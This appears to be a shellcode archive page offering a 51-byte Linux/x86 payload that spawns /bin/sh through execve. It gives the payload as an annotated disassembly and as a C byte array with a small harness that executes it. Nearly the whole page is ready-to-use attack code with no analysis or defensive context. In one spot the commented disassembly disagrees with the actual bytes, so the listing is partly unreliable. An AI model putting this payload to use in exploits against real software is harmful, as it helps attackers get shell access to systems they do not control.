<html><head><title>Linux/x86 - execve() - 51bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
*linux/x86 execve()51bytes
* 08048080 &lt;_start&gt;:
* 8048080: eb 1a jmp 804809c
* 08048082 :
* 8048082: 5e pop %esi
* 8048083: 31 c0 xor %eax,%eax
* 8048085: 88 46 07 mov %al,0x7(%esi)
* 8048088: 8d 1e lea (%esi),%ebx
* 804808a: 89 5e 08 mov %ebx,0x8(%esi)
* 804808d: 89 46 0c mov %eax,0xc(%esi)
* 8048090: b0 0b mov $0xb,%al
* 8048092: 89 f3 mov %esi,%ebx
* 8048094: 8d 4e 08 lea 0x8(%esi),%ecx
* 8048097: 8d 4e 0c lea 0xc(%esi),%ecx
* 804809a: cd 80 int $0x80
* 0804809c :
* 804809c: e8 e1 ff ff ff call 8048082
* 80480a1: 2f das
* 80480a2: 62 69 6e bound %ebp,0x6e(%ecx)
* 80480a5: 2f das
* 80480a6: 73 68 jae 8048110
* 80480a8: 4a dec %edx
* 80480a9: 41 inc %ecx
* 80480aa: 41 inc %ecx
* 80480ab: 41 inc %ecx
* 80480ac: 41 inc %ecx
* 80480ad: 4b dec %ebx
* 80480ae: 4b dec %ebx
* 80480af: 4b dec %ebx
* 80480b0: 4b dec %ebx
*/
#include&lt;stdio.h&gt;
char shellcode[]=&quot;\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d&quot;
&quot;\x1e\x89\x5e\x08\x89\x46&quot;
&quot;\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1&quot;
&quot;\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41&quot;
&quot;\x4b\x4b\x4b\x4b&quot;;
main()
{ void (*routine)();
routine=&amp;shellcode;
printf(&quot;size of shellcode: %dbytes\n&quot;,sizeof(shellcode));
routine();
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
